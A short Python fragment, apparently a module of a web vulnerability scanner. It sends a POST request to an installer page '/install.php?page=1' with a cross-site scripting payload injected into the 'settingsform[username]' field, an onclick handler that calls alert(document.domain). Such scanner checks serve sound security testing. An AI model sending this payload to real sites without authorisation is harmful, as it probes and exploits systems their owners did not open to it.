...
class Module(Scanner, Http_client):
    ...
    def run(self):
        path = '/install.php?page=1'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="settingsform[username]=pdteam'+onclick='alert(document.domain)\n")
